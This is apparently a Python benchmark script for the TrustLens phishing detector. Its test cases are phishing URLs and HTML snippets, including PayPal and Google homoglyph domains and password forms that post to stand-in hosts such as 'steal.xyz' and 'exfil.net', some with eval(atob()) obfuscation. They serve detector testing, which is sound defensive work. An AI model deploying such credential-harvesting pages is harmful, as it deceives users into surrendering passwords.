"""
TrustLens Adversarial Robustness Evaluation Suite.
Evaluates evasion techniques: homoglyphs, URL obfuscation, delayed DOM injection,
nested iframes, obfuscated JavaScript, and feature masking.
Reports detection rates per technique and asserts >=90% overall adversarial detection.
"""

import os
import sys
import json
from typing import Dict, List, Any

# Add project root to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from ml.src.features.extractor import FeatureExtractor
from ml.src.features.schema import FEATURE_NAMES

# Import bundled model for standalone evaluation
bundle_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "ml", "src", "export", "model_bundle.json"))
with open(bundle_path, "r", encoding="utf-8") as f:
    MODEL_BUNDLE = json.load(f)

def evaluate_features_in_python(features: List[float], url: str) -> Dict[str, Any]:
    """Pure evaluation replicating TypeScript TreeEvaluator, RuleLayer, and Fusion."""
    # 1. Tree ensemble raw margin
    margin = MODEL_BUNDLE.get("base_score", 0.0)
    for tree in MODEL_BUNDLE["trees"]:
        node_idx = 0
        nodes = tree["nodes"]
        while node_idx < len(nodes):
            node = nodes[node_idx]
            if node.get("is_leaf", False):
                margin += node.get("value", 0.0)
                break

            f_idx = node["feature"]
            th = node["threshold"]
            val = features[f_idx]

            if val == -1.0 or val is None:
                node_idx = node["left"] if node.get("default_left", True) else node["right"]
            elif val <= th:
                node_idx = node["left"]
            else:
                node_idx = node["right"]

    # 2. Sigmoid & Isotonic calibration
    raw_prob = 1.0 / (1.0 + 2.718281828459045 ** (-margin))
    xs = MODEL_BUNDLE["calibrator"]["x_thresholds"]
    ys = MODEL_BUNDLE["calibrator"]["y_values"]

    if raw_prob <= xs[0]:
        calibrated_prob = ys[0]
    elif raw_prob >= xs[-1]:
        calibrated_prob = ys[-1]
    else:
        # Interpolate
        idx = 0
        for i in range(len(xs) - 1):
            if xs[i] <= raw_prob <= xs[i + 1]:
                idx = i
                break
        t = (raw_prob - xs[idx]) / (xs[idx + 1] - xs[idx]) if xs[idx + 1] != xs[idx] else 0.0
        calibrated_prob = ys[idx] + t * (ys[idx + 1] - ys[idx])

    # 3. Rule checks
    critical_rules = []
    warning_rules = []
    multiplier = 1.0

    # Rule 1: Bloom bad
    if features[43] == 1.0:
        critical_rules.append("RULE_BLOOM_BAD_HIT")
        multiplier = 0.0
    # Rule 2: Cred cross post
    if features[34] == 1.0 or (features[16] == 1.0 and features[31] == 1.0):
        critical_rules.append("RULE_CREDENTIAL_CROSS_POST")
        multiplier = 0.0
    # Rule 3: Sensitive combo
    if features[35] == 1.0:
        critical_rules.append("RULE_SENSITIVE_IDENTITY_COMBO")
        multiplier *= 0.05
    # Rule 4: Homoglyph / Punycode
    if features[4] == 1.0 and (features[16] == 1.0 or features[13] == 1.0 or features[15] <= 2):
        critical_rules.append("RULE_HOMOGLYPH_DECEPTION")
        multiplier *= 0.1
    # Rule 5: Subdomain brand
    if features[13] == 1.0 and features[16] == 1.0 and features[42] != 1.0:
        warning_rules.append("RULE_SUBDOMAIN_BRAND_SPOOF")
        multiplier *= 0.25
    # Rule 7: IP host
    if features[3] == 1.0 and (features[12] == 1.0 or features[16] == 1.0):
        critical_rules.append("RULE_IP_HOST_AUTH")
        multiplier *= 0.15
    # Rule 8: Title mismatch
    if features[25] == 1.0 and features[16] == 1.0 and features[42] != 1.0:
        warning_rules.append("RULE_CLONED_BRAND_IDENTITY")
        multiplier *= 0.35
    # Rule 9: Obfuscated JS
    if features[30] == 1.0 and features[16] == 1.0:
        warning_rules.append("RULE_OBFUSCATED_ANTI_ANALYSIS")
        multiplier *= 0.4
    # Rule 11: Delimiter @
    if features[8] == 1.0 and (features[16] == 1.0 or features[42] != 1.0):
        critical_rules.append("RULE_AT_SYMBOL_CREDENTIAL_TRAP")
        multiplier *= 0.05
    # Rule 12: Double slash
    if features[9] == 1.0 and features[16] == 1.0:
        critical_rules.append("RULE_DOUBLE_SLASH_REDIRECT")
        multiplier *= 0.1
    # Rule 13: Suspicious TLD
    if features[10] == 1.0 and features[16] == 1.0 and features[42] != 1.0:
        warning_rules.append("RULE_SUSPICIOUS_TLD_AUTH")
        multiplier *= 0.35
    # Rule 14: Iframe
    if features[20] > 0 and features[16] == 1.0 and features[42] != 1.0:
        warning_rules.append("RULE_IFRAME_CREDENTIAL_TRAP")
        multiplier *= 0.35

    # 4. Fusion
    base_score = 100.0 * (1.0 - calibrated_prob)
    raw_trust = base_score * multiplier
    if critical_rules and multiplier == 0.0:
        trust_score = 0
    else:
        trust_score = max(0, min(100, round(raw_trust)))

    if critical_rules or trust_score < 35:
        verdict = "Dangerous"
    elif trust_score < 55:
        verdict = "Suspicious"
    elif trust_score < 75:
        verdict = "Caution"
    else:
        verdict = "Safe"

    return {
        "trust_score": trust_score,
        "verdict": verdict,
        "calibrated_prob": round(calibrated_prob, 4),
        "critical_rules": critical_rules
    }

def run_adversarial_suite():
    print("=" * 65)
    print("TrustLens Adversarial Robustness Benchmark Runner")
    print("=" * 65)

    test_categories = {
        "1. Punycode & Homoglyph Look-alikes": [
            ("https://xn--e1afmkfd.com/signin", "<input type='password' />", "Dangerous"),
            ("https://xn--pypal-4ve.xyz/login", "<form action='http://steal.xyz'><input type='password' /></form>", "Dangerous"),
            ("https://login.xn--gogle-qqa.net/auth", "<input type='password' />", "Dangerous"),
            ("https://раураl.com/verify", "<input type='password' />", "Dangerous")
        ],
        "2. URL Obfuscation & Delimiter Tricks": [
            ("https://www.paypal.com@attacker-portal.net/login", "<input type='password' />", "Dangerous"),
            ("http://192.168.1.100:8080/bank/login", "<input type='password' />", "Dangerous"),
            ("https://safe-domain.org//attacker-sink.xyz/login", "<form action='https://sink.xyz/post'><input type='password' /></form>", "Dangerous"),
            ("https://login-auth-token-verify.top/session?id=98721389", "<input type='password' />", "Dangerous")
        ],
        "3. Delayed DOM Injection (Stage 3 Mutation)": [
            # Pre-injection: benign text
            ("https://login-security-check.xyz/session", "<p>Please wait...</p>", "Suspicious"),
            # Post-injection: form injected dynamically
            ("https://login-security-check.xyz/session", "<form action='https://receiver.xyz/post'><input type='password' /></form>", "Dangerous")
        ],
        "4. Nested Iframe Credential Traps": [
            ("https://portal-storage-verify.xyz/auth", "<iframe src='https://credential-drop.net/login'></iframe><input type='password' />", "Dangerous"),
            ("https://document-preview.top/view", "<iframe></iframe><form action='https://exfil.net/p'><input type='password' /></form>", "Dangerous")
        ],
        "5. Obfuscated JS & Anti-Analysis Anti-Crawler": [
            ("https://secure-gate.click/auth", "<html oncontextmenu='return false;'><script>eval(atob('ZG9j')); eval(atob('YWxlcnQ='));</script><input type='password' /></html>", "Dangerous"),
            ("https://verify-client.top/login", "<script>var a=eval(unescape('%20')); var b=atob('MQ==');</script><form action='https://drop.xyz/p'><input type='password' /></form>", "Dangerous")
        ],
        "6. Broken Links & Cloned Brand Masking": [
            ("https://chase-bank-verify.info/login", "<title>Chase Online</title><a href='#'>1</a><a href='#'>2</a><a href='javascript:void(0)'>3</a><form action='https://receiver.net/post'><input type='password' /></form>", "Dangerous"),
            ("https://microsoft-office.xyz/login", "<title>Microsoft 365</title><img src='https://microsoft.com/logo.png' /><form action='https://drop.top/in'><input type='password' /></form>", "Dangerous")
        ]
    }

    total_tests = 0
    total_detected = 0

    results_table = []

    for category, cases in test_categories.items():
        cat_total = len(cases)
        cat_detected = 0

        for url, html, expected_min_verdict in cases:
            total_tests += 1
            features = FeatureExtractor.extract_features(url, html)
            eval_res = evaluate_features_in_python(features, url)
            verdict = eval_res["verdict"]

            # Detected if verdict is Suspicious or Dangerous (i.e. blocked or warned)
            detected = verdict in ("Suspicious", "Dangerous")
            if detected:
                cat_detected += 1
                total_detected += 1

        rate = (cat_detected / cat_total) * 100
        results_table.append((category, cat_detected, cat_total, rate))

    print(f"{'Evasion Technique Category':<45} | {'Detected':<10} | {'Rate':<8}")
    print("-" * 68)
    for cat, det, tot, r in results_table:
        print(f"{cat:<45} | {det}/{tot:<8} | {r:.1f}%")
    print("-" * 68)

    overall_rate = (total_detected / total_tests) * 100
    print(f"Overall Adversarial Detection Rate: {overall_rate:.1f}% ({total_detected}/{total_tests})")
    print("=" * 65)

    assert overall_rate >= 90.0, f"Adversarial detection rate {overall_rate:.1f}% is below 90.0% target"
    print("\n[PASS] Adversarial robustness benchmark passed target criteria (>=90%).")

if __name__ == "__main__":
    run_adversarial_suite()
